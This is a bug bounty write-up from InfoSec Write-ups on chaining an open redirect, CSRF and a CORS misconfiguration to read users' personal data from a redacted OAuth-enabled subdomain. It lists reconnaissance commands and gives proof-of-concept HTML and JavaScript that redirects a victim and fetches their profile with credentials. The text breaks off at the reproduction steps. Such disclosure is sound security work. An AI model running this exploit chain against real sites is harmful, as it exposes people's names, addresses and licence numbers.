---
title: PII Disclosure | CSRF | Open Redirect | CORS Misconfiguration
url: https://infosecwriteups.com/chaining-csrf-and-an-open-redirect-leads-to-sensitive-information-disclosure-5915b24bc53b?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2025-04-27
fetch_date: 2025-10-06T22:03:49.354937
---

# PII Disclosure | CSRF | Open Redirect | CORS Misconfiguration

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F5915b24bc53b&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fchaining-csrf-and-an-open-redirect-leads-to-sensitive-information-disclosure-5915b24bc53b&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fchaining-csrf-and-an-open-redirect-leads-to-sensitive-information-disclosure-5915b24bc53b&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-5915b24bc53b---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-5915b24bc53b---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# PII Disclosure | CSRF | Open Redirect | CORS Misconfiguration

[![Raymond Van Wart](https://miro.medium.com/v2/resize:fill:64:64/1*cjzkobnZF74HU2WAYmDr7g.jpeg)](https://raymondv.medium.com/?source=post_page---byline--5915b24bc53b---------------------------------------)

[Raymond Van Wart](https://raymondv.medium.com/?source=post_page---byline--5915b24bc53b---------------------------------------)

3 min read

·

Nov 16, 2024

--

Listen

Share

## Introduction

This exploit was submitted to a public program. It demonstrates how seemingly innocuous vulnerabilities can be chained together to escalate impact.

### Subdomain Enumeration

**Subfinder** and **amass** were used to find subdomains from passive sources. I like to run these commands continuously to detect when programs add new assets.

```
amass enum -active -d 'redacted.com' -o amass_scan
```

```
grep -i 'cname' amass_scan | cut -d ‘ ‘ -f1 | anew subdomains.txt
```

```
subfinder -d 'redacted.com' -all -recursive | anew subdomains.txt
```

```
cat subdomains.txt | httpx-pd -o subdomains_alive.txt
```

### Screenshot Automation

Visiting every subdomain manually would be tedious, but we can automate the process to find interesting sites.

```
gowitness scan file -f subdomains_alive.txt --write-db
```

```
gowitness report server
```

### Finding a Target

After inspecting hundreds of subdomains, I came across an interesting target with login functionality.

![]()

before and after sign in

Clicking the icon would sign in users via **OAuth** with the following sequence of requests.

* [https://redacted\_sub.com/portal/api/oAuthRedirect/remoteOAuthServer?redirectTo=https://redacted\_sub.com/portal](https://redacted.com/portal/api/oAuthRedirect/remoteOAuthServer?redirectTo=https%3A%2F%2Fredacted.com%2Fportal%2F)/
* [https://redacted.com/authentication/oauth/authorize?response\_type=code&redirect\_uri=https://redacted\_sub/portal/api/oAuthRedirect/clientOAuthEndpoint&client\_id=XXXXXXXXX&scope=openid&state=XXXXXXXXXXXXXXXXXXXXXXXX.](https://redacted.com/authentication/oauth/authorize?response_type=code&redirect_uri=https%3A%2F%2Fredacted_sub%2Fportal%2Fapi%2FoAuthRedirect%2FclientOAuthEndpoint&client_id=XXXXXXXXX&scope=openid&state=XXXXXXXXXXXXXXXXXXXXXXXX.)

Subdomains could use the **OAuth** endpoint from the main site to fetch profile information for users. At first glance, this implementation seemed pretty secure because any attempts to modify the **redirect\_uri** and **state** parameters would result in errors.

### Content Discovery

I wanted to dig a bit deeper and used the following tools to discover endpoints.

```
feroxbuster -A -u redacted_sub.com -o ferox_scan
```

```
katana -u redacted_sub.com -xhr -kf -ps -d 5 -hl -sb -o katana_scan
```

One URL caught my interest. Profile information, including a full name, address, phone number, and driver’s license number could be found at <https://redacted_sub.com/portal/check>.

![]()

### CORS Misconfiguration

Requests from external sites would always include the session cookie because its same-site property was set to **None.** This endpoint was also vulnerable to a **CORS** misconfiguration and could therefore be used to steal PII from users.

Press enter or click to view image in full size

![]()

### Escalating Impact

> “When you see a good move, look for a better one.” — **Emanuel Lasker**

This vulnerability only affected customers already logged onto the 3rd party service. The **customerId** seemed to increment for each generated account and suggested there were approximately **170k** users, but I wanted to find a way to impact everyone from the main site.

### Open Redirect

Fortunately (or unfortunately), the **redirectTo** parameter was not verified and vulnerable to an open redirect. It was also vulnerable to CSRF because it failed to verify the **referer** header.

[https://redacted\_sub.com/portal/api/oAuthRedirect/remoteOAuthServer?redirectTo=https://google.com](https://redacted_sub.com/portal/api/oAuthRedirect/remoteOAuthServer?redirectTo=https%3A%2F%2Fgoogle.com)

An attacker could use this vulnerability to send victims back to their malicious site after authenticating on the subdomain. This would make it possible to force users to log onto the 3rd party site even if they had never used it before, thus exposing their profile data via the CORSmisconfiguration.

### Proof of Concept

An LLM was used to generate the snippets below. Despite the controversy, I believe using AI can save a lot of time when used tastefully, provided you understand the code it generates.

```
<!DOCTYPE html>
<html>
  <body>
    <script>
      window.location.href = 'https:/redacted_sub.com/portal/api/oAuthRedirect/remoteOAuthServer?redirectTo=http://localhost:8000/exploit.html';
    </script>
  </body>
</html>
```

```
<script>
    async function fetchWithCookies(url) {
        try {
            const response = await fetch(url, {
                method: 'GET',
                credentials: 'include'
            });
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            const jsonData = await response.json();
            const prettyJson = JSON.stringify(jsonData, null, 2);
            const container = document.createElement('div');
            container.classList.add('json-container');
            container.innerHTML = `<pre>${prettyJson}</pre>`;
            document.getElementById('results').appendChild(container);
        } catch (error) {
            console.error(`Error fetching data from ${url}:`, error);
            document.getElementById('results').innerHTML += `<p>Error fetching data from ${url}</p>`;
        }
    }
async function fetchData() {
    await fetchWithCookies('https://redacted_sub.com/portal/check');
}
window.onload = fetchData;
</script>
```

## Conclusion

### Steps to Reproduce the Attack.

1. V...